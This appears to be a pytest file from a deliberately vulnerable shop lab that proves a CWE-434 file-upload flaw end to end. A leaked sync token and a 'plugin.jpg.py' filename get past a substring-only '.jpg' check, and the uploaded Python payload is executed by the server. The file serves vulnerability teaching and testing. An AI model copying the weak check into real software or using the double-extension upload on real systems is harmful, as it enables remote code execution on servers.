"""Demonstrates the lab's actual vulnerability chain end to end,
deterministically: POST /api/catalog/products, authenticated only with a
leaked catalog-sync-service token (no session, no admin role -- a mere
customer's own login never grants this), accepts a photo whose filename
merely CONTAINS ".jpg" (app/services/catalog_photos.py::looks_like_jpeg_filename),
not that it's the real extension. A file named "plugin.jpg.py" satisfies
that check while its real extension -- the one
vulnerable/upload/image_processor.py actually executes on -- is `.py`.

This is the same underlying CWE-434 proof as the old
tests/test_upload_vuln.py (which still covers app/routes/api_images.py in
isolation, now reachable only via this app's own backend), just reached
through the attacker-facing front door instead.
"""
import io
import os

from app.config import config
from app.models.db import query_one

PROOF_MARKER = "shoplab_catalog_sync_rce_proof"


def test_missing_or_wrong_token_rejected(client):
    resp = client.post(
        "/api/catalog/products",
        data={"name": "x", "category": "x", "description": "x", "price": "9.99"},
    )
    assert resp.status_code == 401

    resp = client.post(
        "/api/catalog/products",
        headers={"X-Catalog-Sync-Token": "totally-made-up"},
        data={"name": "x", "category": "x", "description": "x", "price": "9.99"},
    )
    assert resp.status_code == 401


def test_customer_session_alone_does_not_authenticate(client, alice):
    """Logging in as an ordinary customer must not grant this -- it's a
    completely separate trust boundary from any session, admin or not."""
    resp = client.post(
        "/api/catalog/products",
        data={"name": "x", "category": "x", "description": "x", "price": "9.99"},
    )
    assert resp.status_code == 401


def test_valid_token_creates_a_product_with_no_photo(client, catalog_sync_token):
    resp = client.post(
        "/api/catalog/products",
        headers={"X-Catalog-Sync-Token": catalog_sync_token},
        data={"name": "Warehouse Widget", "category": "Misc", "description": "synced from warehouse", "price": "12.50"},
    )
    assert resp.status_code == 201
    body = resp.get_json()
    assert body["image_path"] is None
    product = query_one("SELECT name, price_cents FROM products WHERE id = ?", (body["product_id"],))
    assert product["name"] == "Warehouse Widget"
    assert product["price_cents"] == 1250


def test_photo_missing_jpg_substring_is_rejected(client, catalog_sync_token):
    resp = client.post(
        "/api/catalog/products",
        headers={"X-Catalog-Sync-Token": catalog_sync_token},
        data={
            "name": "x", "category": "x", "description": "x", "price": "9.99",
            "photo": (io.BytesIO(b"whatever"), "photo.png"),
        },
        content_type="multipart/form-data",
    )
    assert resp.status_code == 400


def test_genuine_jpg_photo_is_accepted_and_served(client, catalog_sync_token):
    resp = client.post(
        "/api/catalog/products",
        headers={"X-Catalog-Sync-Token": catalog_sync_token},
        data={
            "name": "Real Product", "category": "x", "description": "x", "price": "19.99",
            "photo": (io.BytesIO(b"\xff\xd8\xff\xe0 not really a jpeg but has the substring"), "product.jpg"),
        },
        content_type="multipart/form-data",
    )
    assert resp.status_code == 201
    image_path = resp.get_json()["image_path"]
    assert image_path is not None

    resp = client.get(f"/product-photos/{image_path}")
    assert resp.status_code == 200


def test_double_extension_photo_actually_executes(client, catalog_sync_token):
    """End-to-end proof of remote code execution: 'plugin.jpg.py' contains
    the required '.jpg' substring (passes catalog_photos.py's check) but
    its real extension is '.py' (what image_processor.py branches on)."""
    payload = f"""
import os
os.environ['{PROOF_MARKER}'] = 'executed'
open(os.path.join(os.path.dirname(__file__), 'catalog_sync_rce_proof.txt'), 'w').write('code executed as this process')
"""
    resp = client.post(
        "/api/catalog/products",
        headers={"X-Catalog-Sync-Token": catalog_sync_token},
        data={
            "name": "Malicious Sync", "category": "x", "description": "x", "price": "1.00",
            "photo": (io.BytesIO(payload.encode()), "plugin.jpg.py", "image/jpeg"),
        },
        content_type="multipart/form-data",
    )
    assert resp.status_code == 201, "a filename containing '.jpg' must pass the weak check"

    proof_path = os.path.join(config.UPLOAD_DIR, "catalog_sync_rce_proof.txt")
    assert os.path.exists(proof_path), "the smuggled .py file should have executed"
    assert os.environ.get(PROOF_MARKER) == "executed"

    os.remove(proof_path)
    del os.environ[PROOF_MARKER]
